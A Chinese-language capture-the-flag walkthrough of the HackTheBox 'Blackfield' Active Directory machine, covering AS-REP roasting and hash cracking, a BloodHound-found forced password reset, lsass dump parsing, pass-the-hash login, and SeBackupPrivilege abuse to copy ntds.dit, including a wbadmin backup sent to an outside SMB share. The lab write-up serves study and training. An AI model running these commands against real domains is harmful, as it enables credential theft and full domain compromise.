## nmap 扫描
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101]
└─$ sudo nmap -Pn -sS -p- --open --min-rate 1000 10.10.10.192
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 09:25 EDT
Nmap scan report for 10.10.10.192
Host is up (0.41s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

```

## 匿名访问SMB
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101]
└─$ smbclient -L //10.10.10.192 -N                                                                                                                                              1 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 

```

`profiles$`共享可以匿名访问
```
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ...
  ...
  ...

```

从共享名字可以看出，这些大概率都是用户名，所以我们可以使用这些用户名来发起`ASREPRoasting`攻击

首先获取当前域的域名

```
msf6 auxiliary(scanner/smb/smb_version) > run 

[*] 10.10.10.192:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:required) (guid:{6b3285a5-4dbf-4cd4-a41e-0c7e5b807485}) (authentication domain:BLACKFIELD)
[*] 10.10.10.192:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 

```

然后利用`impacket-GetNPUsers`发起请求

```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Blackfield]
└─$ impacket-GetNPUsers BLACKFIELD/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.192                                                                                  130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$support@BLACKFIELD:9e3d126591f1eb29f2092107fda8097f$b6166dd7d7de60960be54eaf649e98613c57e8d0b281cf559d0b2f0cbed32ee96bbc0f1af89bccd5ba513df924cbac6735faad4c46a87ed721ba359a0ec54c11415c4af718b58392c50a5bdd8c17a358154330bd5ecf207309f304fc73af46dfd45f5d7726ffaee6cfe764f75dc29458ac7a3c0ae6a36263e07f79d5f6e8100ddad49d0a8b4d637ac81f457c1090c2f0eb67d595c5f46090e43f6ac1fa016567d7e3ef4b0172aa9fd22f33dddc39bb52221295559c4f0e2655d09db448d00d7be7984355b732220035e1e08ef3afc31f847d0b03976d594997efacf8c8d9b6d1a0efbe857503de60a12d786d5f83
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
```
除了`support`账户的错误配置之外，还有`audit2020`和`svc_backup`账户没有设置`UF_DONT_REQUIRE_PREAUTH`

```
Indicates whether Kerberos pre-authentication is required to logon using the user or computer account. This parameter sets the ADS_UF_DONT_REQUIRE_PREAUTH flag of the Active Directory UAC attribute.
```

首先破解`support`账户的密码
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Blackfield]
└─$ hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$support@BLACKFIELD:9e3d126591f1eb29f2092107fda8097f$b6166dd7d7de60960be54eaf649e98613c57e8d0b281cf559d0b2f0cbed32ee96bbc0f1af89bccd5ba513df924cbac6735faad4c46a87ed721ba359a0ec54c11415c4af718b58392c50a5bdd8c17a358154330bd5ecf207309f304fc73af46dfd45f5d7726ffaee6cfe764f75dc29458ac7a3c0ae6a36263e07f79d5f6e8100ddad49d0a8b4d637ac81f457c1090c2f0eb67d595c5f46090e43f6ac1fa016567d7e3ef4b0172aa9fd22f33dddc39bb52221295559c4f0e2655d09db448d00d7be7984355b732220035e1e08ef3afc31f847d0b03976d594997efacf8c8d9b6d1a0efbe857503de60a12d786d5f83:#00^BlackKnight
```


获得`support`用户的密码后，可以使用`bloodhound.py`来连接服务器来把域信息下载回来，它可以把各个对象的安全描述符转换成可读形式

```
┌──(kali㉿kali)-[~/Tools/BloodHound.py]
└─$ python bloodhound.py -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -dc blackfield.local --zip -c DcOnly
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: blackfield.local
INFO: Found 316 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 52 groups
INFO: Found 1 computers
INFO: Found 0 trusts
INFO: Done in 00M 28S
INFO: Compressing output into 20220601091949_bloodhound.zip
```

接着分析下载回来的`users.json`文件
```json
{
    "AllowedToDelegate": [],
    "ObjectIdentifier": "S-1-5-21-4194615774-2175524697-3563712290-1104",
    "PrimaryGroupSID": "S-1-5-21-4194615774-2175524697-3563712290-513",
    "Properties": {
        "name": "SUPPORT@BLACKFIELD.LOCAL",
        "domain": "BLACKFIELD.LOCAL",
        "domainsid": "S-1-5-21-4194615774-2175524697-3563712290",
        "distinguishedname": "CN=SUPPORT,CN=USERS,DC=BLACKFIELD,DC=LOCAL",
        "unconstraineddelegation": false,
        "trustedtoauth": false,
        "passwordnotreqd": false,
        "enabled": true,
        "lastlogon": 1600727612,
        "lastlogontimestamp": 1654114794,
        "pwdlastset": 1582480403,
        "dontreqpreauth": true,
        "pwdneverexpires": true,
        "sensitive": false,
        "serviceprincipalnames": [],
        "hasspn": false,
        "displayname": null,
        "email": null,
        "title": null,
        "homedirectory": null,
        "description": null,
        "userpassword": null,
        "admincount": false,
        "sidhistory": [],
        "whencreated": 1582458632,
        "unixpassword": null,
        "unicodepassword": null,
        "sfupassword": null
    },
    "Aces": [
        {
            "RightName": "Owns",
            "IsInherited": false,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-512",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": false,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-512",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": false,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-548",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AddKeyCredentialLink",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-526",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AddKeyCredentialLink",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-527",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-519",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericWrite",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "WriteOwner",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AllExtendedRights",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "WriteDacl",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        }
    ],
    "SPNTargets": [],
    "HasSIDHistory": [],
    "IsDeleted": false,
    "IsACLProtected": false
},
{
    "AllowedToDelegate": [],
    "ObjectIdentifier": "S-1-5-21-4194615774-2175524697-3563712290-1103",
    "PrimaryGroupSID": "S-1-5-21-4194615774-2175524697-3563712290-513",
    "Properties": {
        "name": "AUDIT2020@BLACKFIELD.LOCAL",
        "domain": "BLACKFIELD.LOCAL",
        "domainsid": "S-1-5-21-4194615774-2175524697-3563712290",
        "distinguishedname": "CN=AUDIT2020,CN=USERS,DC=BLACKFIELD,DC=LOCAL",
        "unconstraineddelegation": false,
        "trustedtoauth": false,
        "passwordnotreqd": false,
        "enabled": true,
        "lastlogon": 0,
        "lastlogontimestamp": 1600727780,
        "pwdlastset": 1600727706,
        "dontreqpreauth": false,
        "pwdneverexpires": true,
        "sensitive": false,
        "serviceprincipalnames": [],
        "hasspn": false,
        "displayname": null,
        "email": null,
        "title": null,
        "homedirectory": null,
        "description": null,
        "userpassword": null,
        "admincount": false,
        "sidhistory": [],
        "whencreated": 1582458585,
        "unixpassword": null,
        "unicodepassword": null,
        "sfupassword": null
    },
    "Aces": [
        {
            "RightName": "Owns",
            "IsInherited": false,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-512",
            "PrincipalType": "Group"
        },
        {
            "RightName": "ForceChangePassword",
            "IsInherited": false,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-1104",
            "PrincipalType": "User"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": false,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-512",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": false,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-548",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AddKeyCredentialLink",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-526",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AddKeyCredentialLink",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-527",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericAll",
            "IsInherited": true,
            "PrincipalSID": "S-1-5-21-4194615774-2175524697-3563712290-519",
            "PrincipalType": "Group"
        },
        {
            "RightName": "GenericWrite",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "WriteOwner",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "AllExtendedRights",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        },
        {
            "RightName": "WriteDacl",
            "IsInherited": true,
            "PrincipalSID": "BLACKFIELD.LOCAL-S-1-5-32-544",
            "PrincipalType": "Group"
        }
    ],
    "SPNTargets": [],
    "HasSIDHistory": [],
    "IsDeleted": false,
    "IsACLProtected": false
}
```

可以看到在用户`audit2020`的`ace`列表中，存在`ForceChangePassword`权限，并且`PrincipalSID`为`support`用户的`ObjectIdentifier`，说明`support`用户拥有修改`audit2020`用户密码的权限

这里我们可以使用`rpcclient`来进行利用

```
┌──(kali㉿kali)-[~/Tools/BloodHound.py]
└─$ rpcclient -U blackfield/support 10.10.10.192
Enter BLACKFIELD\support's password: 
rpcclient $> setuserinfo audit2020 23 Passw0rd!
```


接着使用`audit2020`用户登录`smb`

```bash
┌──(kali㉿kali)-[~/Tools/BloodHound.py]
└─$ smbclient //10.10.10.192/forensic -Uaudit2020                                                                                                                             130 ⨯
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1680581 blocks available
smb: \> 

smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

```

我们先把`lsass.zip`下载回来，然后利用`pypykatz`来获取密码

```bash
pypykatz lsa minidump lsass.DMP
```

现在我们可以得到部分用户的`hash`，可以进行`PTH`看是否能够成功登录

成功登录`svc_backup`并得到`user.txt`

```
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_backup> type desktop\user.txt
3920bb317a0bef51027e2852be64b543
```


## 提权

首先来看看当前用户的权限
```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

可以看到属于`BUILTIN\Backup Operators`组，拥有`SeBackupPrivilege`和`SeRestorePrivilege`权限，该权限可以让用户备份系统文件。

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls C:\users\administrator\Desktop


    Directory: C:\users\administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt


*Evil-WinRM* PS C:\Users\svc_backup\Documents> type C:\users\administrator\Desktop\root.txt
Access to the path 'C:\users\administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ type C:\users\administrator\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

看得到文件，但是无法读取。不过我们可以使用`robcopy`的备份模式来进行拷贝

```
*Evil-WinRM* PS C:\Users\svc_backup\temp> robocopy /b c:\users\administrator\desktop .

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, June 2, 2022 1:38:35 PM
   Source : c:\users\administrator\desktop\
     Dest : C:\Users\svc_backup\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   3	c:\users\administrator\desktop\
	    New File  		     282	desktop.ini
  0%
100%
	    New File  		     447	notes.txt
  0%
100%
	    New File  		      32	root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         3         3         0         0         0         0
   Bytes :       761       761         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Thursday, June 2, 2022 1:38:35 PM

*Evil-WinRM* PS C:\Users\svc_backup\temp> ls


    Directory: C:\Users\svc_backup\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt


*Evil-WinRM* PS C:\Users\svc_backup\temp> cat root.txt
4375a629c7c67c8e29db269060c955cb
*Evil-WinRM* PS C:\Users\svc_backup\temp> 

```

官方`witeup`这里`root.txt`是无法访问的，需要提权到`administrator`

### 方法 1

如果该服务器是域控制器，那么这里可以使用卷备份来提取`ntds`，首先创建一个文件`flag.dsh`内容如下：
```
set context persistent nowriters
add volume c: alias flag
create
expose %flag% z:
```

然后进行格式转换`unix2dos`，接着上传到服务器执行`diskshadow /s flag.dsh`.

这样就可以把整个`c`盘备份到映射的`z`盘了，然后再从`z`盘里拷贝`ntds`

```
robocopy /b z:\windows\ntds . ntds.dit
```

最后拷贝下来使用`impacket-secretdump`来解密得到`hash`，接着再使用`hash`登录得到`root.txt`


### 方法 2

和方法1差不多，不过这里使用了[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)提供的`dll`来进行拷贝

对于非域控制器的机器，需要保存注册表中的`SAM`, `SECURITY`, `SYSTEM` 三个文件来进行解密


### 方法 3

使用`wbadmin`来进行备份

首先创建一个匿名`smb`服务器，用于文件上传

接着进行开始备份，把备份上传到`smb`服务器，如果有多余的磁盘，可以备份到别的磁盘上

```
echo "Y" | wbadmin start backup -backuptarget:\\smbserver\share -include:c:\windows\ntds
```

然后把备份进行恢复
```
wbadmin get version         # 先获取版本

echo "Y" | wbadmin start recovery -version:xxxxx -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\temp\ -notrestoreacl
```

## 参考链接

[https://richardspowershellblog.wordpress.com/2012/02/23/set-user-to-not-require-kerberos-preauthentication/](https://richardspowershellblog.wordpress.com/2012/02/23/set-user-to-not-require-kerberos-preauthentication/)

[https://stackoverflow.com/questions/67371962/ldap-query-to-get-the-acl](https://stackoverflow.com/questions/67371962/ldap-query-to-get-the-acl)


[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)